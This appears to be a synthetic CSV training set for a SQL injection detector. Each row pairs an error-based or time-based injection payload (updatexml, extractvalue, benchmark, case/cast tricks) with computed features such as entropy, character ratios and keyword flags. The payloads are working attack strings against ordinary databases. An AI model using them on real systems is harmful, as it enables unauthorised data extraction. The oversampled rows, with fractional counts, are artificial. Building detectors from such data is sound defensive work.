id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",nearest_attack_euclidean,R000262,0.24664914294558082,181.10536726832163,26.889463273167838,3.4963758800126192,36.33161018049648,46.55785309267135,76.10536726832161,22.110536726832162,0.20058177224648505,0.2572649501482377,0.42006033810449617,0.1220929395007811,0.0,0.0,0.0,0.0,0.0,2.0,0.0,14.221073453664323,2.7755575615628914e-17,0.0,5.889463273167839,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000012,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000252,0.19279646547799661,170.16607815503744,31.0,3.6703540360162004,52.0,24.0,68.99949556146066,25.166582593576777,0.3057316886842582,0.1411069332388884,0.4052647018897503,0.14789667618710317,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,14.166582593576777,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000279,0.2662795035654637,187.37280996393255,28.0,3.4404980568593317,40.0,35.0,83.69824797114606,28.67456199278651,0.2135641157944695,0.1868686013201608,0.44655138836015296,0.1530158945252167,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,15.674561992786511,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000014,attack,error,"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000089,0.1073053130092307,179.86101842551477,29.92406789503432,3.7589518662835464,43.77220368510296,46.69627158013728,66.54440737020592,22.84813579006864,0.24338960448249297,0.2596204915797661,0.36996104305058175,0.12702886088715915,1.0,0.0,2.0,0.0,0.0,2.0,0.0,11.92406789503432,2.7755575615628914e-17,0.0,5.9240678950343195,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000015,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000132,0.4614553535353864,144.11690408029585,24.873843440042265,3.6688504841472405,39.49537376016906,35.0,51.873843440042265,17.74768688008453,0.2739706662675002,0.24292395588154148,0.3600014136247248,0.12310396422623346,0.0,0.0,1.7476868800845309,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.0,2.747686880084531,0.0,0.0,0.8738434400422654,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquh""  =  ""uquh",nearest_attack_euclidean,R000250,0.038749162381436934,185.01470058176633,28.058802327065354,3.6317021099403406,45.10290407236437,38.94119767293465,75.0,25.970598836467325,0.24377726612054412,0.21047800775367692,0.40537336403276736,0.14037136209301163,0.0,3.999999999999999,0.0,0.0,0.0,1.9852994182336616,0.0,14.0,2.7755575615628914e-17,0.0,5.985299418233661,1.9852994182336616,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000017,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""uquh""  =  ""uquh",nearest_attack_euclidean,R000250,0.6774860464421245,185.34419380482603,28.344193804826048,3.64905768113146,46.37677521930419,39.0,74.3116123903479,25.655806195173952,0.2501951378771899,0.21042070449322245,0.40095419229446116,0.13842996533512653,0.0,3.999999999999999,0.0,0.0,0.0,1.655806195173952,0.0,14.0,2.7755575615628914e-17,0.0,6.0,1.6558061951739522,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,error,"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",nearest_attack_euclidean,R000037,0.9936423077282278,174.5901660470871,27.0,3.599485561479032,38.37353584705276,45.16861887059632,70.4215471764908,20.62646415294724,0.2204907481580814,0.25866881302692424,0.402852998491855,0.11798744032313936,0.0,0.0,0.0,0.0,0.0,2.0,0.0,13.08430943529816,2.7755575615628914e-17,0.0,5.54215471764908,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000019,attack,error,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000232,0.49233190279332545,164.0,27.0,3.6365390710182823,37.33353571540278,37.221952379462955,63.88902381026852,25.55548809486574,0.22764351045977305,0.22696312426501802,0.3895672183552959,0.15582614691991303,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.55548809486574,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000020,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000098,0.7869566829763887,170.91025406775967,26.308974593224033,3.3882098489209294,42.382050813551935,31.691025406775967,75.14615244065581,21.691025406775967,0.24801429480811504,0.18548886636566822,0.4395619905192254,0.12693484830699137,0.0,0.0,0.0,0.0,1.0,1.0,0.0,14.691025406775967,2.7755575615628914e-17,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.6910254067759678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.691025406775967
SMOTE_000021,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000185,0.646716715928582,191.33930229966134,31.0,3.6704482761498647,55.3572091986454,32.0,78.3213954006773,25.660697700338652,0.2892916839212358,0.1672431917105922,0.40934723058071876,0.13411789378745329,4.0,0.0,0.0,0.0,1.0,1.6606977003386498,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.66069770033865,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000022,attack,error,"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000301,0.692307508411921,182.91245343383818,27.60875465661618,3.4854197147409547,38.82626396984854,36.564981373535275,79.34747206030292,28.173736030151456,0.2126275638689179,0.19976340621555608,0.43368326636483345,0.15392576355069254,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,14.782490686767638,2.0,0.0,5.391245343383819,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000097,0.013776225581830382,133.0,30.0,3.7709390349642016,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000024,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000308,0.9620005157001493,184.29710180665555,30.35144909667223,3.509868837162831,49.40579638668893,26.378019978868483,81.08091817221295,27.43236726888518,0.26847692615196417,0.14282959530381933,0.4398774071466888,0.14881607139752762,0.0,3.999999999999999,0.0,0.0,0.0,1.2161836344425894,0.0,16.0,2.0,0.0,4.216183634442589,1.2161836344425894,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.21618363444258937,0.0,0.0,0.0,1.2161836344425896,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7838163655574106,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.216183634442589
SMOTE_000025,attack,error,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",nearest_attack_euclidean,R000264,0.16386377342660532,149.4806775488023,29.20600466377242,3.761121541009283,52.79399533622758,23.931331778742525,55.618013991317255,17.137336442514943,0.35328813435774337,0.16013733324132598,0.37195176473593805,0.11462276766499259,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.137336442514945,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000018,1.391499704542431,189.47766762072345,32.91067048289382,3.934137952919711,48.47766762072346,47.0,66.0,28.0,0.2558438077004179,0.2480520640998607,0.34832843043810224,0.14777569776161914,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.47766762072345514,0.5223323792765449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000159,0.0003929924755968682,133.0,28.0,3.729320593490451,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000028,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000237,0.8194891581212893,172.89775875256638,30.579551750513275,3.7942897399938857,42.579551750513275,45.10606900068437,64.15910350102655,21.053034500342186,0.24635750605991477,0.2608719784091773,0.37102655871255324,0.12174395681835463,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.526517250171093,2.7755575615628914e-17,0.0,5.526517250171092,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
